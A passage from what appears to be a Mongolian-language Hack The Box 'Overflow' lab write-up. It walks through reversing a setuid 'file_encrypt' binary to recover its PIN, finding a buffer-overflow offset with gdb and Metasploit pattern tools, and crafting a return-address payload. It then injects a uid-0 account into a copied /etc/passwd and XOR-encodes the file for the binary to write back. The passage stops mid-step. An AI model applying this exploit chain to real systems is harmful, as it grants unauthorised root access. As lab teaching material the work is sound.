</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>local_14 = random();</code> - Call RANDOM дуудаж байгааг шалгаж үзэх:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */</span>
</span></span><span style=display:flex><span><span style=color:#75715e>/* WARNING: Unknown calling convention yet parameter storage is locked */</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>long</span> <span style=color:#a6e22e>random</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  uint in_stack_00000004;
</span></span><span style=display:flex><span>  uint local_c;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> local_8;
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  local_c <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x6b8b4567</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>for</span> (local_8 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; local_8 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>10</span>; local_8 <span style=color:#f92672>=</span> local_8 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>    local_c <span style=color:#f92672>=</span> local_c <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x59</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> local_c <span style=color:#f92672>^</span> in_stack_00000004;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p><code>in_stack_00000004</code> - дахин тодорхойлох (xor,ing)</p><h4 id=84-gdb>8.4 gdb<a hidden class=anchor aria-hidden=true href=#84-gdb>#</a></h4><p>cli:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gdb file_encrypt
</span></span></code></pre></div><p>out:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disas random
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> random:
</span></span><span style=display:flex><span>   0x0000081d &lt;+0&gt;:     push   %ebp
</span></span><span style=display:flex><span>   0x0000081e &lt;+1&gt;:     mov    %esp,%ebp
</span></span><span style=display:flex><span>   0x00000820 &lt;+3&gt;:     sub    $0x10,%esp
</span></span><span style=display:flex><span>   0x00000823 &lt;+6&gt;:     call   0xb90 &lt;__x86.get_pc_thunk.ax&gt;
</span></span><span style=display:flex><span>   0x00000828 &lt;+11&gt;:    add    $0x2778,%eax
</span></span><span style=display:flex><span>   0x0000082d &lt;+16&gt;:    movl   $0x6b8b4567,-0x8<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x00000834 &lt;+23&gt;:    movl   $0x0,-0x4<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x0000083b &lt;+30&gt;:    jmp    0x84d &lt;random+48&gt;
</span></span><span style=display:flex><span>   0x0000083d &lt;+32&gt;:    mov    -0x8<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>,%eax
</span></span><span style=display:flex><span>   0x00000840 &lt;+35&gt;:    imul   $0x59,%eax,%eax
</span></span><span style=display:flex><span>   0x00000843 &lt;+38&gt;:    add    $0x14,%eax
</span></span><span style=display:flex><span>   0x00000846 &lt;+41&gt;:    mov    %eax,-0x8<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x00000849 &lt;+44&gt;:    addl   $0x1,-0x4<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x0000084d &lt;+48&gt;:    cmpl   $0x9,-0x4<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x00000851 &lt;+52&gt;:    jle    0x83d &lt;random+32&gt;
</span></span><span style=display:flex><span>   0x00000853 &lt;+54&gt;:    mov    -0x8<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>,%eax
</span></span><span style=display:flex><span>   0x00000856 &lt;+57&gt;:    xor    0x8<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>,%eax
</span></span><span style=display:flex><span>   0x00000859 &lt;+60&gt;:    leave  
</span></span><span style=display:flex><span>   0x0000085a &lt;+61&gt;:    ret    
</span></span><span style=display:flex><span>End of assembler dump.
</span></span></code></pre></div><p><code>0x00000856 &lt;+57>: xor 0x8(%ebp),%eax</code> xor -н breakpoint</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>b * random+57
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b * random+57
</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>1</span> at 0x856
</span></span></code></pre></div><p>breakpoint хүртэл run хийх</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>r
</span></span><span style=display:flex><span>x /10x $ebp +8
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>0xffffd460:     0x6b8b4567      0x56557fa0      0xf7fa7000      0x56555ac7
</span></span><span style=display:flex><span>0xffffd470:     0xf7fa7000      0xf7fe3230      0x00000000      0xf7df9bde
</span></span><span style=display:flex><span>0xffffd480:     0xf7fa73fc      0x56557fa0
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> ctypes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>local_c_initial <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x6b8b4567</span>
</span></span><span style=display:flex><span>local_c <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x6b8b4567</span>
</span></span><span style=display:flex><span>local_8 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> (local_8<span style=color:#f92672>&lt;</span><span style=color:#ae81ff>10</span>):
</span></span><span style=display:flex><span>    local_c <span style=color:#f92672>=</span> local_c <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x59</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span>
</span></span><span style=display:flex><span>    local_8 <span style=color:#f92672>=</span> local_8 <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PIN <span style=color:#f92672>=</span> ctypes<span style=color:#f92672>.</span>c_int(local_c <span style=color:#f92672>^</span> local_c_initial)<span style=color:#f92672>.</span>value
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;The Pin Code is:&#34;</span>, PIN)
</span></span></code></pre></div><p>run:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>The Pin Code is: -202976456
</span></span></code></pre></div><p><code>-202976456</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tester@overflow:/opt/file_encrypt$ ./file_encrypt 
</span></span><span style=display:flex><span>This is the code 1804289383. Enter the Pin: -202976456
</span></span><span style=display:flex><span>name: asdasdsadas
</span></span><span style=display:flex><span>Thanks <span style=color:#66d9ef>for</span> checking. You can give your feedback <span style=color:#66d9ef>for</span> improvements at developer@overflow.htb
</span></span><span style=display:flex><span>tester@overflow:/opt/file_encrypt$
</span></span></code></pre></div><p><code>Segmentation fault (core dumped)</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tester@overflow:/opt/file_encrypt$ ^C
</span></span><span style=display:flex><span>tester@overflow:/opt/file_encrypt$ ./file_encrypt 
</span></span><span style=display:flex><span>This is the code 1804289383. Enter the Pin: -202976456
</span></span><span style=display:flex><span>name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>Thanks <span style=color:#66d9ef>for</span> checking. You can give your feedback <span style=color:#66d9ef>for</span> improvements at developer@overflow.htb
</span></span><span style=display:flex><span>Segmentation fault <span style=color:#f92672>(</span>core dumped<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>gdb -гээс адил нэр хийж харвал:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GNU gdb <span style=color:#f92672>(</span>Debian 10.1-1.7<span style=color:#f92672>)</span> 10.1.90.20210103-git
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span> <span style=color:#ae81ff>2021</span> Free Software Foundation, Inc.
</span></span><span style=display:flex><span>License GPLv3+: GNU GPL version <span style=color:#ae81ff>3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span></span><span style=display:flex><span>This is free software: you are free to change and redistribute it.
</span></span><span style=display:flex><span>There is NO WARRANTY, to the extent permitted by law.
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#34;show copying&#34;</span> and <span style=color:#e6db74>&#34;show warranty&#34;</span> <span style=color:#66d9ef>for</span> details.
</span></span><span style=display:flex><span>This GDB was configured as <span style=color:#e6db74>&#34;x86_64-linux-gnu&#34;</span>.
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#34;show configuration&#34;</span> <span style=color:#66d9ef>for</span> configuration details.
</span></span><span style=display:flex><span>For bug reporting instructions, please see:
</span></span><span style=display:flex><span>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
</span></span><span style=display:flex><span>Find the GDB manual and other documentation resources online at:
</span></span><span style=display:flex><span>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>For help, type <span style=color:#e6db74>&#34;help&#34;</span>.
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#34;apropos word&#34;</span> to search <span style=color:#66d9ef>for</span> commands related to <span style=color:#e6db74>&#34;word&#34;</span>...
</span></span><span style=display:flex><span>Reading symbols from file_encrypt...
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>No debugging symbols found in file_encrypt<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r
</span></span><span style=display:flex><span>Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt 
</span></span><span style=display:flex><span>This is the code 1804289383. Enter the Pin: -202976456
</span></span><span style=display:flex><span>name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>Thanks <span style=color:#66d9ef>for</span> checking. You can give your feedback <span style=color:#66d9ef>for</span> improvements at developer@overflow.htb
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Program received signal SIGSEGV, Segmentation fault.
</span></span><span style=display:flex><span>0x41414141 in ?? <span style=color:#f92672>()</span>
</span></span></code></pre></div><p><code>0x41414141 in ?? ()</code> AAAA -н HEX утга (EIP register)</p><h4 id=85-pattern_createrb>8.5 pattern_create.rb<a hidden class=anchor aria-hidden=true href=#85-pattern_createrb>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <span style=color:#ae81ff>300</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
</span></span></code></pre></div><p>pattern_create ашиглаж 300 string үүсгээд name-n (gdb) оруулна.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r
</span></span><span style=display:flex><span>The program being debugged has been started already.
</span></span><span style=display:flex><span>Start it from the beginning? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span> y
</span></span><span style=display:flex><span>Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt 
</span></span><span style=display:flex><span>This is the code 1804289383. Enter the Pin: -202976456
</span></span><span style=display:flex><span>name: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
</span></span><span style=display:flex><span>Thanks <span style=color:#66d9ef>for</span> checking. You can give your feedback <span style=color:#66d9ef>for</span> improvements at developer@overflow.htb
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Program received signal SIGSEGV, Segmentation fault.
</span></span><span style=display:flex><span>0x35624134 in ?? <span style=color:#f92672>()</span>
</span></span></code></pre></div><p><code>0x35624134 in ?? ()</code></p><h4 id=86-pattern_offsetrb>8.6 pattern_offset.rb<a hidden class=anchor aria-hidden=true href=#86-pattern_offsetrb>#</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <span style=color:#ae81ff>300</span> -q 0x35624134
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exact match at offset <span style=color:#ae81ff>44</span>
</span></span></code></pre></div><p><code>CTRL+c</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r
</span></span><span style=display:flex><span>The program being debugged has been started already.
</span></span><span style=display:flex><span>Start it from the beginning? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span> y
</span></span><span style=display:flex><span>Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt 
</span></span><span style=display:flex><span>This is the code 1804289383. Enter the Pin: -202976456
</span></span><span style=display:flex><span>name: ^C
</span></span><span style=display:flex><span>Program received signal SIGINT, Interrupt.
</span></span><span style=display:flex><span>0xf7fd0559 in __kernel_vsyscall <span style=color:#f92672>()</span>
</span></span></code></pre></div><p>disas encrypt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>  disas encrypt                                                                                                                                               
</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> encrypt:                                                                                                                       
</span></span><span style=display:flex><span>   0x5655585b &lt;+0&gt;:     push   %ebp
</span></span><span style=display:flex><span>   0x5655585c &lt;+1&gt;:     mov    %esp,%ebp
</span></span><span style=display:flex><span>   0x5655585e &lt;+3&gt;:     push   %ebx
</span></span><span style=display:flex><span>   0x5655585f &lt;+4&gt;:     sub    $0x94,%esp
</span></span><span style=display:flex><span>   0x56555865 &lt;+10&gt;:    call   0x56555720 &lt;__x86.get_pc_thunk.bx&gt;
</span></span><span style=display:flex><span>   0x5655586a &lt;+15&gt;:    add    $0x2736,%ebx
</span></span><span style=display:flex><span>   0x56555870 &lt;+21&gt;:    movl   $0x0,-0x80<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x56555877 &lt;+28&gt;:    movl   $0x0,-0x7c<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x5655587e &lt;+35&gt;:    movl   $0x0,-0x78<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x56555885 &lt;+42&gt;:    movl   $0x0,-0x74<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x5655588c &lt;+49&gt;:    movl   $0x0,-0x70<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x56555893 &lt;+56&gt;:    movl   $0x0,-0x94<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x5655589d &lt;+66&gt;:    movl   $0x0,-0x90<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x565558a7 &lt;+76&gt;:    movl   $0x0,-0x8c<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x565558b1 &lt;+86&gt;:    movl   $0x0,-0x88<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x565558bb &lt;+96&gt;:    movl   $0x0,-0x84<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   0x565558c5 &lt;+106&gt;:   sub    $0xc,%esp
</span></span><span style=display:flex><span>   0x565558c8 &lt;+109&gt;:   lea    -0x2350<span style=color:#f92672>(</span>%ebx<span style=color:#f92672>)</span>,%eax
</span></span><span style=display:flex><span>   0x565558ce &lt;+115&gt;:   push   %eax
</span></span><span style=display:flex><span>   0x565558cf &lt;+116&gt;:   call   0x565555e0 &lt;printf@plt&gt;
</span></span><span style=display:flex><span>   0x565558d4 &lt;+121&gt;:   add    $0x10,%esp
</span></span><span style=display:flex><span>   0x565558d7 &lt;+124&gt;:   sub    $0x8,%esp
</span></span><span style=display:flex><span>   0x565558da &lt;+127&gt;:   lea    -0x80<span style=color:#f92672>(</span>%ebp<span style=color:#f92672>)</span>,%eax
</span></span><span style=display:flex><span>   0x565558dd &lt;+130&gt;:   push   %eax
</span></span><span style=display:flex><span>   0x565558de &lt;+131&gt;:   lea    -0x233d<span style=color:#f92672>(</span>%ebx<span style=color:#f92672>)</span>,%eax
</span></span><span style=display:flex><span>   0x565558e4 &lt;+137&gt;:   push   %eax
</span></span><span style=display:flex><span>   0x565558e5 &lt;+138&gt;:   call   0x565556c0 &lt;__isoc99_scanf@plt&gt;
</span></span><span style=display:flex><span>   0x565558ea &lt;+143&gt;:   add    $0x10,%esp
</span></span><span style=display:flex><span>   0x565558ed &lt;+146&gt;:   sub    $0xc,%esp
</span></span><span style=display:flex><span>   0x565558f0 &lt;+149&gt;:   lea    -0x233a<span style=color:#f92672>(</span>%ebx<span style=color:#f92672>)</span>,%eax
</span></span><span style=display:flex><span>   0x565558f6 &lt;+155&gt;:   push   %eax
</span></span></code></pre></div><p>эхэлж байгаа <code>0x5655585b</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python -c “print<span style=color:#f92672>(</span>‘<span style=color:#ae81ff>\x</span>41’ * <span style=color:#ae81ff>44</span> + ‘<span style=color:#ae81ff>\x</span>5b<span style=color:#ae81ff>\x</span>58<span style=color:#ae81ff>\x</span>55<span style=color:#ae81ff>\x</span>56’<span style=color:#f92672>)</span>”
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python -c <span style=color:#e6db74>&#34;print(&#39;\x41&#39; * 44 + &#39;\x5b\x58\x55\x56&#39;)&#34;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style=color:#f92672>[</span>XUV
</span></span></code></pre></div><p>gdb</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r
</span></span><span style=display:flex><span>The program being debugged has been started already.
</span></span><span style=display:flex><span>Start it from the beginning? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span> y
</span></span><span style=display:flex><span>Starting program: /home/va4mi/Documents/htb/machine/Overflow/www/file_encrypt 
</span></span><span style=display:flex><span>This is the code 1804289383. Enter the Pin: -202976456
</span></span><span style=display:flex><span>name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style=color:#f92672>[</span>XUV
</span></span><span style=display:flex><span>Thanks <span style=color:#66d9ef>for</span> checking. You can give your feedback <span style=color:#66d9ef>for</span> improvements at developer@overflow.htb
</span></span><span style=display:flex><span>Enter Input File: 
</span></span></code></pre></div><h4 id=87-root-user-үүсгэх>8.7 Root user үүсгэх<a hidden class=anchor aria-hidden=true href=#87-root-user-үүсгэх>#</a></h4><p>Machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cp /etc/passwd /tmp/passwd
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tester@overflow:/opt/file_encrypt$ cd
</span></span><span style=display:flex><span>tester@overflow:~$ cp /etc/passwd /tmp/passwd
</span></span><span style=display:flex><span>tester@overflow:~$ cd /tmp/
</span></span><span style=display:flex><span>tester@overflow:/tmp$ ls
</span></span><span style=display:flex><span>passwd
</span></span><span style=display:flex><span>systemd-private-1540515aec41459da3c1999dc74ef5f6-apache2.service-otzxtp
</span></span><span style=display:flex><span>systemd-private-1540515aec41459da3c1999dc74ef5f6-systemd-resolved.service-gHFf4R
</span></span><span style=display:flex><span>systemd-private-1540515aec41459da3c1999dc74ef5f6-systemd-timesyncd.service-agZrcR
</span></span><span style=display:flex><span>vmware-root_644-2730496954
</span></span><span style=display:flex><span>tester@overflow:/tmp$ 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>openssl passwd -1 -salt junkhead testing123
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>$1$junkhead$zXM9KUoB7KLu8Zm.JhCL31
</span></span><span style=display:flex><span><span style=color:#75715e>##</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;junkhead:</span>$1$junkhead$zXM9KUoB7KLu8Zm<span style=color:#e6db74>.JhCL31:0:0:root:/root:/bin/bash&#34;</span> &gt;&gt; /tmp/passwd
</span></span></code></pre></div><p><code>root2:r9PB6IP00tOFkjAH</code> - нэмж оруулна</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>...
</span></span><span style=display:flex><span>postfix:x:111:116::/var/spool/postfix:/usr/sbin/nologin
</span></span><span style=display:flex><span>mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style=display:flex><span>developer:x:1001:1001::/home/developer:/bin/sh
</span></span><span style=display:flex><span>sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>root5:KWi2XW05LmkMg:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>dambo::0:0:root:/root:/bin/bash
</span></span></code></pre></div><p>encrypt -> passwd</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>source <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;/tmp/passwd&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>dest <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;/tmp/passwd2&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> source:
</span></span><span style=display:flex><span>dest<span style=color:#f92672>.</span>write(bytes([i <span style=color:#f92672>^</span> <span style=color:#ae81ff>0x9b</span>]))
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> tester tester  <span style=color:#ae81ff>148</span> Mar <span style=color:#ae81ff>21</span> 15:45 encrypt.py
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> tester tester 1.7K Mar <span style=color:#ae81ff>21</span> 15:39 passwd
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>python3 encrypt.py
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ae81ff>1</span> tester tester 1.7K Mar <span style=color:#ae81ff>21</span> 15:45 passwd2
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tester@overflow:/opt/file_encrypt$ ./file_encrypt 
</span></span><span style=display:flex><span>This is the code 1804289383. Enter the Pin: -202976456
</span></span><span style=display:flex><span>name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style=color:#f92672>[</span>XUV
